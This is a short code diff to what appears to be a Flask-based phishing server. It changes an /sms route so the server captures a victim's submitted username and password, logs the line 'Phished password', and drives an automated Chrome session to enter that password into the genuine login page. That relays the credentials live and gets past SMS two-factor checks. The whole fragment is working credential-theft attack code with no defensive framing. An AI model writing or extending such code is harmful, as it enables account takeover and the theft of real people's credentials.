@@ -48,11 +48,18 @@ def verify():
 
 @app.post('/sms')
 def sms():
-    username, password = request.form.get('username'), request.form.get('password')
+    # username, password = request.form.get('username'), request.form.get('password')
+    # if username is None or password is None:
+    #     return redirect(url_for(''))
+    # print_info(f"Selecting SMS code in Chrome...")
+    # chrome_browser.select_sms_code()
+    username = request.form.get('username')
+    password = request.form.get('password')
     if username is None or password is None:
-        return redirect(url_for(''))
-    print_info(f"Selecting SMS code in Chrome...")
-    chrome_browser.select_sms_code()
+        return redirect(url_for('index'))
+    print_important(f"2. Phished password: {password}")
+    print_info("Entering password into Chrome...")
+    chrome_browser.enter_text(password.encode())
     return render_template("sms.html", username=username, password=password)
 
 @app.post('/pmpin')
